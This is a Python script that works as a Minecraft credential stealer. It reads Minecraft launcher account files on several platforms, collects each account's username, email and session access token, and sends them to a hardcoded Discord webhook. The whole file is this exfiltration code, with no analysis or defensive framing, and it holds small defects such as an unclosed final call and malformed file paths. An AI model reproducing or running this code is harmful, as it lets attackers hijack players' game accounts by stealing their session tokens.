python
import json, os, requests
import time

webhook = 'https://discord.com/api/webhooks/1218191862620225536/cfqpLpWkCbkksjrstXTVeclTpirSY3SE84iN_2Zb5IpE3C57foL1PL26Sz6Whepkl30g'

accounts = []

def getuser():
    return os.path.split(os.path.expanduser('~'))[-1]

def sendwebhook():
    embeds = []
    count = 0

    for account in accounts:
        if '@' in account[2]:
            name = 'email address'
        else:
            name = 'xbox username'

        embed = [{
            'fields': [
                {'name': name, 'value': account[2], 'inline': False},
                {'name': 'username', 'value': account[0], 'inline': False},
                {'name': 'session type', 'value': account[1], 'inline': False},
                {'name': 'session authorization', 'value': account[3], 'inline': False}
            ]
        }]

        headers = {
            'content-type': 'application/json',
            'user-agent': 'mozilla/5.0 (x11; linux x86_64) applewebkit/537.11 (khtml, like gecko) chrome/23.0.1271.64 safari/537.11'
        }

        payload = json.dumps({'embeds': embed})
        req = requests.post(url=webhook, data=payload, headers=headers).text

def getlocations():
    if os.name == 'nt':
        locations = [
            f'{os.getenv("appdata")}\\\\.minecraft\\\\launcher_accounts.json',
            f'{os.getenv("appdata")}\\\\local\\packages\\\\microsoft.minecraftuwp_8wekyb3d8bbwe\\\\localstate\\\\games\\\\com.mojang\\\\'
        ]
        return locations
    else:
        locations = [
            f'\\\\home\\\\{getuser()}\\\\.minecraft\\\\launcher_accounts.json',
            f'\\\\sdcard\\\\games\\\\com.mojang\\\\',
            f'\\\\~\\\\library\\\\application support\\\\minecraft'
            f'apps\\\\com.mojang.minecraftpe\\\\documents\\\\games\\\\com.mojang\\\\'
        ]
        return locations

def main():
    for location in getlocations():
        if os.path.exists(location):
            auth_db = json.loads(open(location).read())['accounts']

            for d in auth_db:
                sessionkey = auth_db[d].get('accesstoken')
                username = auth_db[d].get('minecraftprofile')['name']
                sessiontype = auth_db[d].get('type')
                email = auth_db[d].get('username')
                if sessionkey != None and sessionkey != '':
                    accounts.append([username, sessiontype, email, sessionkey])

    sendwebhook()

if __name__ == '__main__':
    main()
    
time.sleep(10
